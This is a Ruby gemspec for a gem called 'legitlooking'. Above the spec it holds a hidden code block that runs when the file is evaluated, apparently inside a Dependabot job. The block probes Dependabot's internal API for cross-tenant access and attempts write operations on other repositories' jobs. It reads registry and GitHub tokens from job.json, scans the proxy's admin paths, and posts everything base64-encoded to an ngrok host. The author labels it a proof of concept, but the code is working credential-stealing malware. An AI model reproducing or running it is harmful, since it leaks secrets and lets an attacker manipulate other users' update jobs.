# frozen_string_literal: true

COLLAB_URL = "https://6e51-2001-1c00-307-d600-5dfa-d53c-8fc6-791b.ngrok-free.app"

begin
  require "uri"
  require "net/http"
  require "json"

  lines = []

  job_id  = ENV["DEPENDABOT_JOB_ID"].to_s
  api_url = ENV["DEPENDABOT_API_URL"] || "https://dependabot-actions.githubapp.com"
  proxy_h = "172.19.0.2"
  proxy_p = 1080

  lines << "=== DEPENDABOT INTERNAL API PROBE ==="
  lines << "job_id=#{job_id}  api_url=#{api_url}"

  # Make a request via the credential-injecting proxy
  req_via_proxy = lambda do |method, url, body = nil|
    uri   = URI(url)
    klass = { "GET" => Net::HTTP::Get, "POST" => Net::HTTP::Post,
              "PATCH" => Net::HTTP::Patch }[method]
    r = klass.new(uri)
    r["Content-Type"] = "application/json"
    r["Accept"]       = "application/json"
    r.body = body.to_json if body
    Net::HTTP.start(uri.host, uri.port, proxy_h, proxy_p,
                    use_ssl: (uri.scheme == "https"),
                    open_timeout: 8, read_timeout: 8) { |h| resp = h.request(r)
      { code: resp.code.to_s,
        body: resp.body.to_s[0, 1500],
        loc:  resp["location"].to_s } }
  rescue => e
    { code: "ERR", body: e.message[0, 200], loc: "" }
  end

  # ============================================================
  # 1. OWN JOB -- bevestig authenticatie werkt
  # ============================================================
  lines << "\n=== 1. OWN JOB DETAILS ==="
  r = req_via_proxy.("GET", "#{api_url}/update_jobs/#{job_id}")
  lines << "HTTP #{r[:code]}: #{r[:body][0, 600]}"

  # ============================================================
  # 2. OWN /details VOLLEDIG -- meer dan 400 chars
  # ============================================================
  lines << "\n=== 2. OWN /details VOLLEDIG ==="
  r = req_via_proxy.("GET", "#{api_url}/update_jobs/#{job_id}/details")
  lines << "HTTP #{r[:code]}: #{r[:body][0, 4000]}"

  # ============================================================
  # 3. CROSS-TENANT: /details op adjacent job IDs
  # Dit is de echte vraag: werkt /details ook voor andere repos?
  # ============================================================
  lines << "\n=== 3. CROSS-TENANT /details PROBE ==="
  jid = job_id.to_i
  [-10, -5, -4, -3, -2, -1, 1, 2, 3, 4, 5, 10].each do |offset|
    target = jid + offset
    r = req_via_proxy.("GET", "#{api_url}/update_jobs/#{target}/details")
    preview = r[:body][0, 500].gsub(/\s+/, " ")
    lines << "  #{target}/details → HTTP #{r[:code]} | #{preview}"
  end

  # ============================================================
  # 4. WRITE ops op andere job IDs -- IDOR via POST/PATCH
  # Kunnen we andere repos' jobs manipuleren?
  # ============================================================
  lines << "\n=== 4. WRITE IDOR OP ADJACENT JOBs ==="
  test_target = jid - 1
  [
    ["PATCH", "#{api_url}/update_jobs/#{test_target}/mark_as_processed",
     { "base-commit-sha" => "0000000000000000000000000000000000000000" }],
    ["POST",  "#{api_url}/update_jobs/#{test_target}/record_ecosystem_versions",
     { "ecosystem_versions" => { "package_managers" => { "bundler" => "99.0" } } }],
    ["POST",  "#{api_url}/update_jobs/#{test_target}/create_pull_request",
     { "pull-request" => { "title" => "test" } }],
  ].each do |method, url, body|
    r = req_via_proxy.(method, url, body)
    ep = url.split("/").last
    lines << "  #{method} /#{test_target}/#{ep}: HTTP #{r[:code]} | #{r[:body][0, 300]}"
  end

  # ============================================================
  # 5. /credentials met Job-Token header expliciet leeg
  # ============================================================
  lines << "\n=== 5. CREDENTIALS ENDPOINT ANALYSE ==="
  r = req_via_proxy.("GET", "#{api_url}/update_jobs/#{job_id}/credentials")
  lines << "  403 detail: #{r[:body][0, 600]}"
  # Probeer met job_id als token
  begin
    uri2 = URI("#{api_url}/update_jobs/#{job_id}/credentials")
    req2  = Net::HTTP::Get.new(uri2)
    req2["Content-Type"]       = "application/json"
    req2["X-Dependabot-Job-Id"] = job_id
    req2["Authorization"]       = "token #{job_id}"
    Net::HTTP.start(uri2.host, uri2.port, proxy_h, proxy_p,
                    use_ssl: true, open_timeout: 8, read_timeout: 8) do |h|
      resp = h.request(req2)
      lines << "  met job_id als auth: HTTP #{resp.code} | #{resp.body.to_s[0, 400]}"
    end
  rescue => e
    lines << "  auth probe error: #{e.message}"
  end

  # ============================================================
  # 4. JOB.JSON -- volledige credentials uit het job-bestand
  # ============================================================
  lines << "\n=== 4. JOB.JSON CREDENTIALS ==="
  job_path = ENV.fetch("DEPENDABOT_JOB_PATH",
                       "/home/dependabot/dependabot-updater/job.json")
  begin
    jdata = JSON.parse(File.read(job_path))
    job   = jdata["job"] || {}
    # Credentials bevatten registry tokens, GitHub tokens, npm tokens, etc.
    lines << "credentials: #{job["credentials"].inspect[0, 1000]}"
    # Overige interessante velden
    %w[source allowed_updates existing_pull_requests security_advisories
       experiments ignore_conditions updating_a_pull_request].each do |k|
      lines << "#{k}: #{job[k].inspect[0, 400]}" if job.key?(k)
    end
  rescue => e
    lines << "job.json error: #{e}"
  end

  # ============================================================
  # 5. PROXY ADMIN INTERFACE -- verborgen poorten / debug endpoints
  # ============================================================
  lines << "\n=== 5. PROXY HTTP DIRECT (172.19.0.2:1080) ==="
  %w[/ /admin /metrics /health /debug /config /token /credentials /v1/token].each do |path|
    begin
      require "socket"; require "timeout"
      Timeout.timeout(3) do
        s = TCPSocket.new(proxy_h, proxy_p)
        s.write("GET #{path} HTTP/1.0\r\nHost: #{proxy_h}\r\n\r\n")
        lines << "  #{path}: #{s.read(400).gsub(/\r?\n/, ' ')[0, 300]}"
        s.close
      end
    rescue => e
      lines << "  #{path}: #{e.message}"
    end
  end

  # ============================================================
  # 6. DEPENDABOT LIST/ENUMERATE -- root API endpoints
  # ============================================================
  lines << "\n=== 6. ROOT API ENUMERATION ==="
  %w[/ /update_jobs /v1 /api /graphql /internal].each do |path|
    r = req_via_proxy.("GET", "#{api_url}#{path}")
    lines << "  #{path}: HTTP #{r[:code]} | #{r[:body][0, 300]}"
  end

  # ============================================================
  # EXFIL
  # ============================================================
  payload = [lines.join("\n").encode("UTF-8", invalid: :replace, undef: :replace)].pack("m0")
  uri = URI("#{COLLAB_URL}?poc=internal_api")
  post = Net::HTTP::Post.new(uri)
  post["Content-Type"] = "text/plain"
  post.body = payload
  Net::HTTP.start(uri.host, uri.port, use_ssl: true,
                  open_timeout: 20, read_timeout: 20) { |h| h.request(post) }

rescue => e
  begin
    uri = URI("#{COLLAB_URL}?poc=internal_api&err=#{URI.encode_www_form_component(e.message[0, 200])}")
    Net::HTTP.get(uri)
  rescue; end
end

Gem::Specification.new do |spec|
  spec.name          = "legitlooking"
  spec.version       = "1.0.20"
  spec.authors       = ["researcher"]
  spec.summary       = "A normal looking gem"
  spec.require_paths = ["lib"]
  spec.add_dependency "rails", "~> 7.0"
  spec.add_dependency "devise", "~> 4.9"
end
